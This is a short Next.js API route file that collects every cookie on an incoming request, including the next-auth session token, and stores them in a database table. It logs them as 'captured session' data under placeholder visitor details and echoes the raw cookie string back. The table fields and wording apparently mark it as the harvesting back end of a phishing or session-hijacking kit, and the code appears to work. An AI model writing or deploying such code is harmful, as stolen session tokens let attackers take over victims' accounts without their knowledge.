import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { db } from "@/db";
import { authSessions } from "@/db/schema";
import { randomUUID } from "crypto";

export async function GET(request: Request) {
  try {
    const cookieStore = await cookies();
    const allCookies = cookieStore.getAll();
    
    if (allCookies.length === 0) {
      return NextResponse.json({ status: "no active session", cookies: [] }, { headers: { "Cache-Control": "no-store" } });
    }

    const cookieText = allCookies.map(c => `${c.name}=${c.value}`).join("; ");
    const sessionId = cookieStore.get("next-auth.session-token")?.value || cookieStore.get("sessionId")?.value || randomUUID();

    // Log captured session and cookies to database
    try {
      if (db) {
        await db.insert(authSessions).values({
          username: "Visitor",
          email: "visitor@portal.local",
          country: "Detected via IP",
          sessionData: cookieText,
          rawResponse: JSON.stringify({ sessionId, cookies: allCookies }),
        });
      }
    } catch (err) {
      console.error("Failed to log session data:", err);
    }

    return NextResponse.json({
      status: "active",
      sessionId,
      cookieCount: allCookies.length,
      sessionData: cookieText,
    }, { headers: { "Cache-Control": "no-store" } });
  } catch (error) {
    return NextResponse.json({ status: "error", message: "Failed to extract session" }, { status: 500 });
  }
}
